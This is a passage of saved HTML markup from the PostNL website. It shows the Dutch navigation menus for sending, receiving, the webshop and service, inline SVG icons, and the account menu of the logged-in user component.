2.41565C8.83858 1.88061 7.98971 1.85929 7.45295 2.36805L7.40983 2.41081C6.8658 2.97545 6.86307 3.86661 7.40362 4.43455L14.699 12.0996L7.41589 19.572C6.87024 20.1318 6.86756 21.0219 7.40983 21.585C7.9277 22.1227 8.78484 22.1402 9.32431 21.624Z" fill="currentColor"></path></svg></div></span></button><div class="main-nav__sublist-wrapper" id="desktop-main-navigation-versturen" bis_skin_checked="1"><button type="button" class="main-nav__button main-nav__button--back"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.6757 21.624L6.42815 13.1431C5.8612 12.56 5.85677 11.6349 6.41809 11.0464L14.651 2.41565C15.1614 1.88061 16.0103 1.85929 16.547 2.36805L16.5902 2.41081C17.1342 2.97545 17.1369 3.86661 16.5964 4.43455L9.30096 12.0996L16.5841 19.572C17.1298 20.1318 17.1324 21.0219 16.5902 21.585C16.0723 22.1227 15.2152 22.1402 14.6757 21.624Z" fill="currentColor"></path></svg>Terug naar overzicht</button><h2 class="stamp-heading stamp-heading--size-s stamp-heading--color-subtle main-nav__sublist-title">Versturen</h2><ul class="main-nav__sublist main-nav__sublist--default"><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://www.postnl.nl/versturen/pakket-versturen/"><span class="stamp-link__content">Pakket versturen</span></a><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://www.postnl.nl/versturen/brief-of-kaart-versturen/"><span class="stamp-link__content">Brief of kaart versturen</span></a><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://www.postnl.nl/versturen/postzegels/"><span class="stamp-link__content">Postzegels</span></a><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></li></ul><ul class="main-nav__sublist main-nav__sublist--illustrated"><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://www.postnl.nl/tarieven/?productCountry=NL&amp;weight=0-2000&amp;product=pakket"><span class="stamp-link__content">Tarieven</span></a><img aria-hidden="true" src="tarieven.png" class="main-nav__image" alt="Tarieven" loading="lazy"></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://jouw.postnl.nl/online-versturen/?pst=sp-pnl-nav-verz-ql2-versturen"><span class="stamp-link__content">Online frankeren</span></a><img aria-hidden="true" src="pakket_postzegelcode.png" class="main-nav__image" alt="Online frankeren" loading="lazy"></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://shop.postnl.nl/webshop/postzegels/?pst=sp-pnl-nav-verz-ql3-shop-zegels"><span class="stamp-link__content">Postzegels kopen</span></a><img aria-hidden="true" src="postzegels-kopen_tcm10-89036.png" class="main-nav__image" alt="Postzegels kopen" loading="lazy"></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://www.postnl.nl/locatiewijzer/"><span class="stamp-link__content">PostNL-punten</span></a><img aria-hidden="true" src="postnl-locaties_tcm10-89034.png" class="main-nav__image" alt="PostNL-punten" loading="lazy"></li></ul></div></div></li><li class="main-nav__item"><div class="main-nav__item-wrapper" bis_skin_checked="1"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" id="menu-item-Ontvangen" href="https://www.postnl.nl/ontvangen/"><span class="stamp-link__content">Ontvangen</span></a><button class="main-nav__trigger stamp-link" aria-expanded="false" aria-controls="menu-item-desktop-main-navigation"><span class="visually-hidden">Open submenu</span><span class="stamp-link__content"><div class="stamp-link__icon stamp-link__icon--end" bis_skin_checked="1"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.32431 21.624L17.5719 13.1431C18.1388 12.56 18.1432 11.6349 17.5819 11.0464L9.34896 2.41565C8.83858 1.88061 7.98971 1.85929 7.45295 2.36805L7.40983 2.41081C6.8658 2.97545 6.86307 3.86661 7.40362 4.43455L14.699 12.0996L7.41589 19.572C6.87024 20.1318 6.86756 21.0219 7.40983 21.585C7.9277 22.1227 8.78484 22.1402 9.32431 21.624Z" fill="currentColor"></path></svg></div></span></button><div class="main-nav__sublist-wrapper" id="desktop-main-navigation-ontvangen" bis_skin_checked="1"><button type="button" class="main-nav__button main-nav__button--back"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.6757 21.624L6.42815 13.1431C5.8612 12.56 5.85677 11.6349 6.41809 11.0464L14.651 2.41565C15.1614 1.88061 16.0103 1.85929 16.547 2.36805L16.5902 2.41081C17.1342 2.97545 17.1369 3.86661 16.5964 4.43455L9.30096 12.0996L16.5841 19.572C17.1298 20.1318 17.1324 21.0219 16.5902 21.585C16.0723 22.1227 15.2152 22.1402 14.6757 21.624Z" fill="currentColor"></path></svg>Terug naar overzicht</button><h2 class="stamp-heading stamp-heading--size-s stamp-heading--color-subtle main-nav__sublist-title">Ontvangen</h2><ul class="main-nav__sublist main-nav__sublist--default"><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://www.postnl.nl/ontvangen/post-ontvangen/"><span class="stamp-link__content">Post ontvangen</span></a><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://www.postnl.nl/ontvangen/pakket-ontvangen/"><span class="stamp-link__content">Pakket ontvangen</span></a><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://www.postnl.nl/ontvangen/post-doorsturen/"><span class="stamp-link__content">Post doorsturen</span></a><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></li></ul><ul class="main-nav__sublist main-nav__sublist--illustrated"><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://jouw.postnl.nl/track-and-trace/?pst=sp-pnl-nav-ontv-ql1-track-and-trace"><span class="stamp-link__content">Track &amp; Trace</span></a><img aria-hidden="true" src="package_search.svg" class="main-nav__image" alt="Track &amp; Trace" loading="lazy"></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://www.postnl.nl/ontvangen/post-doorsturen/verhuisservice/"><span class="stamp-link__content">Verhuisservice</span></a><img aria-hidden="true" src="Verhuisservice.png" class="main-nav__image" alt="Verhuisservice" loading="lazy"></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://jouw.postnl.nl/porto/"><span class="stamp-link__content">Portokosten</span></a><img aria-hidden="true" src="portokosten.jpg" class="main-nav__image" alt="Portokosten" loading="lazy"></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://www.postnl.nl/ontvangen/pakket-ontvangen/bezorging-pakketten/bezorgvoorkeuren/"><span class="stamp-link__content">Bezorgvoorkeuren</span></a><img aria-hidden="true" src="home-love_(1).svg" class="main-nav__image" alt="Bezorgvoorkeuren" loading="lazy"></li></ul></div></div></li><li class="main-nav__item"><div class="main-nav__item-wrapper" bis_skin_checked="1"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" id="menu-item-Webshop" href="https://shop.postnl.nl/webshop"><span class="stamp-link__content">Webshop</span></a><button class="main-nav__trigger stamp-link" aria-expanded="false" aria-controls="menu-item-desktop-main-navigation"><span class="visually-hidden">Open submenu</span><span class="stamp-link__content"><div class="stamp-link__icon stamp-link__icon--end" bis_skin_checked="1"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.32431 21.624L17.5719 13.1431C18.1388 12.56 18.1432 11.6349 17.5819 11.0464L9.34896 2.41565C8.83858 1.88061 7.98971 1.85929 7.45295 2.36805L7.40983 2.41081C6.8658 2.97545 6.86307 3.86661 7.40362 4.43455L14.699 12.0996L7.41589 19.572C6.87024 20.1318 6.86756 21.0219 7.40983 21.585C7.9277 22.1227 8.78484 22.1402 9.32431 21.624Z" fill="currentColor"></path></svg></div></span></button><div class="main-nav__sublist-wrapper" id="desktop-main-navigation-webshop" bis_skin_checked="1"><button type="button" class="main-nav__button main-nav__button--back"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.6757 21.624L6.42815 13.1431C5.8612 12.56 5.85677 11.6349 6.41809 11.0464L14.651 2.41565C15.1614 1.88061 16.0103 1.85929 16.547 2.36805L16.5902 2.41081C17.1342 2.97545 17.1369 3.86661 16.5964 4.43455L9.30096 12.0996L16.5841 19.572C17.1298 20.1318 17.1324 21.0219 16.5902 21.585C16.0723 22.1227 15.2152 22.1402 14.6757 21.624Z" fill="currentColor"></path></svg>Terug naar overzicht</button><h2 class="stamp-heading stamp-heading--size-s stamp-heading--color-subtle main-nav__sublist-title">Webshop</h2><ul class="main-nav__sublist main-nav__sublist--default"><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://shop.postnl.nl/webshop/postzegels"><span class="stamp-link__content">Postzegels</span></a><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://shop.postnl.nl/webshop/verpakkingen"><span class="stamp-link__content">Verpakkingen</span></a><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://shop.postnl.nl/webshop/kantoorartikelen"><span class="stamp-link__content">Kantoorartikelen</span></a><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://shop.postnl.nl/webshop/cadeaus"><span class="stamp-link__content">Cadeaus</span></a><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://shop.postnl.nl/webshop/collect-club"><span class="stamp-link__content">Collect Club</span></a><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://shop.postnl.nl/webshop/zakelijke-hulpmiddelen"><span class="stamp-link__content">Zakelijke hulpmiddelen</span></a><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></li></ul><ul class="main-nav__sublist main-nav__sublist--illustrated"></ul></div></div></li><li class="main-nav__item"><div class="main-nav__item-wrapper" bis_skin_checked="1"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" id="menu-item-Service &amp; Contact" href="https://www.postnl.nl/klantenservice/"><span class="stamp-link__content">Service &amp; Contact</span></a><div class="main-nav__sublist-wrapper" id="desktop-main-navigation-service &amp; contact" bis_skin_checked="1"><button type="button" class="main-nav__button main-nav__button--back"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.6757 21.624L6.42815 13.1431C5.8612 12.56 5.85677 11.6349 6.41809 11.0464L14.651 2.41565C15.1614 1.88061 16.0103 1.85929 16.547 2.36805L16.5902 2.41081C17.1342 2.97545 17.1369 3.86661 16.5964 4.43455L9.30096 12.0996L16.5841 19.572C17.1298 20.1318 17.1324 21.0219 16.5902 21.585C16.0723 22.1227 15.2152 22.1402 14.6757 21.624Z" fill="currentColor"></path></svg>Terug naar overzicht</button><h2 class="stamp-heading stamp-heading--size-s stamp-heading--color-subtle main-nav__sublist-title">Service &amp; Contact</h2><ul class="main-nav__sublist main-nav__sublist--default"></ul><ul class="main-nav__sublist main-nav__sublist--illustrated"></ul></div></div></li></ul></nav></div><div class="header__universal--login" bis_skin_checked="1"><pnl-user-menu sts-type="akamai" sts-server="https://login.postnl.nl/101112a0-4a0f-4bbb-8176-2f1b2d370d7c/login" client-id="bd9f1610-b56d-4e05-a09b-f696f05ddade" silent-renew-page="https://www.postnl.nl/silent-renew" language="nl_NL" domain="postnl.nl" redirect-uri="https://www.postnl.nl/signin" post-logout-redirect-uri="https://www.postnl.nl/signin" class="hydrated" data-scrapbook-adoptedstylesheets="3" data-scrapbook-shadowdom="<div><pnl-consumer-user-menu sts-type=&quot;akamai&quot; sts-server=&quot;https://login.postnl.nl/101112a0-4a0f-4bbb-8176-2f1b2d370d7c/login&quot; client-id=&quot;bd9f1610-b56d-4e05-a09b-f696f05ddade&quot; silent-renew-page=&quot;https://www.postnl.nl/silent-renew&quot; menu-style=&quot;normal&quot; class=&quot;hydrated&quot; data-scrapbook-adoptedstylesheets=&quot;4&quot; data-scrapbook-shadowdom=&quot;<div><nav id=&amp;quot;pnl-user-menu-section&amp;quot; class=&amp;quot;pci-flyout pnl-user-menu&amp;quot;>
<title>arrow_up</title>
<path fill=&amp;quot;currentcolor&amp;quot; d=&amp;quot;M27.778 19.771l-10.417-9.871c-0.696-0.66-1.785-0.665-2.488-0.012l-10.644 9.895c-0.642 0.597-0.679 1.602-0.082 2.244 0.024 0.026 0.050 0.052 0.076 0.076v0c0.698 0.655 1.783 0.659 2.485 0.008l9.414-8.732 9.177 8.717c0.692 0.657 1.777 0.66 2.472 0.007v0c0.646-0.606 0.678-1.621 0.072-2.266-0.021-0.023-0.044-0.045-0.066-0.067z&amp;quot;></path>
</svg>
</i></button><pnl-user-menu-item-list class=&amp;quot;hydrated&amp;quot;><div class=&amp;quot;is-hidden&amp;quot;><ul id=&amp;quot;pnl-user-menu-container&amp;quot; class=&amp;quot;pci-flyout__list&amp;quot;><li class=&amp;quot;pci-flyout__list-item&amp;quot;><a class=&amp;quot;pci-flyout__link&amp;quot; href=&amp;quot;https://jouw.postnl.nl/account/&amp;quot;><i class=&amp;quot;pci-flyout__icon&amp;quot; aria-hidden=&amp;quot;true&amp;quot;><svg xmlns=&amp;quot;http://www.w3.org/2000/svg&amp;quot; xmlns:xlink=&amp;quot;http://www.w3.org/1999/xlink&amp;quot; width=&amp;quot;24&amp;quot; height=&amp;quot;24&amp;quot; viewBox=&amp;quot;0 0 24 24&amp;quot;>
    <defs>
        <path id=&amp;quot;57gembq27a&amp;quot; d=&amp;quot;M10 1.053c1.241 0 2.251.949 2.251 2.116 0 1.165-1.01 2.114-2.25 2.114-1.242 0-2.253-.95-2.253-2.114 0-1.167 1.011-2.116 2.252-2.116m6.21.722c.692-.91 2.082-1.183 2.998-.487.418.318.691.773.77 1.288.08.531-.056 1.061-.384 1.491l-4.57 6.034c-.137.18-.211.406-.211.63v1.776l.001.166v.945l.001.076v.227c-.002.202-.03.394-.164.532-.184.19-.805.546-.88.547-.034 0-.074-.01-.074-.039v-1.075c-.002-.01-.005-.022-.005-.033V10.17c0-.221.073-.435.208-.612l4.71-6.201c.134-.175.19-.39.156-.606-.032-.214-.15-.404-.328-.533-.369-.268-.893-.192-1.168.168L12.995 7.89c-.138.178-.352.28-.58.28H7.612c-.226 0-.44-.102-.578-.278L2.73 2.386c-.274-.36-.798-.436-1.168-.168-.179.129-.296.319-.328.533-.033.216.022.43.155.606l4.717 6.195c.13.17.2.377.2.59v3.781h5.188c.223 0 .435.027.588.156.201.173.58.756.58.828 0 .03-.009.07-.04.07H5.748c-.582 0-.56-.486-.564-.837v-3.532c0-.178-.059-.352-.168-.495L.406 4.069c-.328-.432-.464-.962-.384-1.493.079-.513.35-.968.767-1.286.917-.698 2.309-.426 3.001.486l3.918 5.153c.089.118.23.188.38.188h3.823c.15 0 .291-.07.38-.188zM10 0c1.86 0 3.373 1.42 3.373 3.169 0 1.746-1.513 3.167-3.373 3.167-1.86 0-3.373-1.421-3.373-3.167C6.627 1.42 8.14 0 10 0z&amp;quot;></path>
    </defs>
    <g fill=&amp;quot;none&amp;quot; fill-rule=&amp;quot;evenodd&amp;quot;>
        <g>
            <g>
                <g transform=&amp;quot;translate(-1006 -784) translate(1006 784) translate(2 4)&amp;quot;>
                    <use fill=&amp;quot;currentcolor&amp;quot; xlink:href=&amp;quot;#57gembq27a&amp;quot;></use>
                </g>
            </g>
        </g>
    </g>
</svg>
</i><span class=&amp;quot;pci-flyout__link-text&amp;quot;>Mijn overzicht</span></a></li><li class=&amp;quot;pci-flyout__list-item&amp;quot;><a class=&amp;quot;pci-flyout__link&amp;quot; href=&amp;quot;https://jouw.postnl.nl/account/mijn-pakketten&amp;quot;><i class=&amp;quot;pci-flyout__icon&amp;quot; aria-hidden=&amp;quot;true&amp;quot;><svg xmlns=&amp;quot;http://www.w3.org/2000/svg&amp;quot; width=&amp;quot;24&amp;quot; height=&amp;quot;24&amp;quot; fill=&amp;quot;none&amp;quot;><path fill=&amp;quot;currentcolor&amp;quot; d=&amp;quot;m21.068 7.121-.023-.056a.567.567 0 0 0-.295-.291l-8.691-3.73a.571.571 0 0 0-.439 0l-8.344 3.4a.567.567 0 0 0-.325.522v8.314a.57.57 0 0 0 .314.507l8.314 4.157a.57.57 0 0 0 .82-.506v-8.315l7.558-2.996v7.52l-5.234 2.044-.458.182c-.211.083-.423.128-.513.313a3.452 3.452 0 0 0-.22 1.058c0 .03.05.099.08.087l1.511-.6 5.612-2.17a.567.567 0 0 0 .355-.525V7.31a.535.535 0 0 0-.022-.189Zm-9.221-2.944 2.51 1.085-6.871 2.895-2.543-1.164 6.904-2.816Zm-.582 14.342-7.18-3.59V7.847l2.887 1.311v4.01c-.03.206.02.417.136.59.264.243.565.443.892.593.034 0 .106 0 .106-.042V9.672l3.159 1.436v7.411Zm.582-8.39L8.91 8.793 15.8 5.878l3.242 1.395-7.195 2.857Z&amp;quot;></path></svg></i><span class=&amp;quot;pci-flyout__link-text&amp;quot;>Volg je pakket</span></a></li><li class=&amp;quot;pci-flyout__list-item&amp;quot;><a class=&amp;quot;pci-flyout__link&amp;quot; href=&amp;quot;https://jouw.postnl.nl/account/mijn-bestellingen&amp;quot;><i class=&amp;quot;pci-flyout__icon&amp;quot; aria-hidden=&amp;quot;true&amp;quot;><svg width=&amp;quot;24&amp;quot; height=&amp;quot;24&amp;quot; viewBox=&amp;quot;0 0 24 24&amp;quot; fill=&amp;quot;none&amp;quot; xmlns=&amp;quot;http://www.w3.org/2000/svg&amp;quot;>
<path fill-rule=&amp;quot;evenodd&amp;quot; clip-rule=&amp;quot;evenodd&amp;quot; d=&amp;quot;M15.6416 5.0941C15.6416 5.16196 15.2981 5.74406 15.115 5.90841C14.9776 6.03193 14.7851 6.00304 14.583 6.00304C13.6768 6.00304 5.22502 6.00304 4.01505 6.00304V17.997H20.0495C20.0495 15.6428 20.0495 17.0205 20.0495 11.9232C20.0495 11.7236 20.0204 11.5335 20.1452 11.3978C20.3116 11.2168 20.9006 10.8775 20.9693 10.8775C20.9995 10.8775 21.0645 10.8862 21.0645 10.914C21.0645 15.8521 21.0645 16.0699 21.0645 18.4985C21.0645 18.7755 20.8374 19 20.5569 19H3.50766C3.22717 19 3 18.7755 3 18.4985V5.50152C3 5.22452 3.22717 5 3.50766 5C5.81613 5 14.627 5 15.6048 5C15.6328 5 15.6416 5.06441 15.6416 5.0941ZM10.0937 15.4606C10.0937 15.7596 10.3371 16.0016 10.6378 16.0016C10.9383 16.0016 11.182 15.7596 11.182 15.4606V10.2628C11.182 9.96376 10.9383 9.72175 10.6378 9.72175C10.3371 9.72175 10.0937 9.96376 10.0937 10.2628V15.4606ZM7.94996 15.4606C7.94996 15.7596 8.19339 16.0016 8.49415 16.0016C8.79464 16.0016 9.03834 15.7596 9.03834 15.4606V10.2628C9.03834 9.96376 8.79464 9.72175 8.49415 9.72175C8.19339 9.72175 7.94996 9.96376 7.94996 10.2628V15.4606ZM5.806 15.4606C5.806 15.7596 6.0497 16.0016 6.35045 16.0016C6.65094 16.0016 6.89464 15.7596 6.89464 15.4606V10.2628C6.89464 9.96376 6.65094 9.72175 6.35045 9.72175C6.0497 9.72175 5.806 9.96376 5.806 10.2628V15.4606ZM17.4908 10.5359C17.4721 10.5563 17.515 10.6064 17.5372 10.6263C17.5881 10.6716 18.2523 10.8084 18.4968 10.7837C18.6805 10.7652 18.7855 10.6032 18.9196 10.4548C20.0723 9.17819 17.872 11.6155 20.8713 8.29311C20.8743 8.28993 20.8753 8.28542 20.878 8.28224C21.0391 8.09484 21.0423 7.82526 20.878 7.63414C20.8753 7.63069 20.8743 7.62645 20.8713 7.62301C20.7183 7.45363 18.7231 5.15544 18.4968 5.13265C18.2523 5.10773 17.5881 5.24451 17.5372 5.2901C17.515 5.30998 17.4721 5.35981 17.4908 5.38049C19.0257 7.0804 18.6125 6.62289 19.3654 7.45654C17.538 7.45654 16.1446 7.45654 15.2794 7.45654C15.0786 7.45654 14.8871 7.50319 14.7506 7.62645C14.5688 7.7908 14.2275 8.33526 14.2275 8.40312C14.2275 8.43307 14.2363 8.45958 14.264 8.45958C15.0724 8.45958 18.3936 8.45958 19.3654 8.45958C18.2101 9.73935 18.6701 9.22988 17.4908 10.5359Z&amp;quot; fill=&amp;quot;currentColor&amp;quot;></path>
</svg>
</i><span class=&amp;quot;pci-flyout__link-text&amp;quot;>Verzendlabels en postzegelcodes</span></a></li><li class=&amp;quot;pci-flyout__list-item&amp;quot;><a class=&amp;quot;pci-flyout__link&amp;quot; href=&amp;quot;https://shop.postnl.nl/bestellingen&amp;quot;><i class=&amp;quot;pci-flyout__icon&amp;quot; aria-hidden=&amp;quot;true&amp;quot;><svg xmlns=&amp;quot;http://www.w3.org/2000/svg&amp;quot; xmlns:xlink=&amp;quot;http://www.w3.org/1999/xlink&amp;quot; width=&amp;quot;24&amp;quot; height=&amp;quot;24&amp;quot; viewBox=&amp;quot;0 0 24 24&amp;quot;>
    <defs>
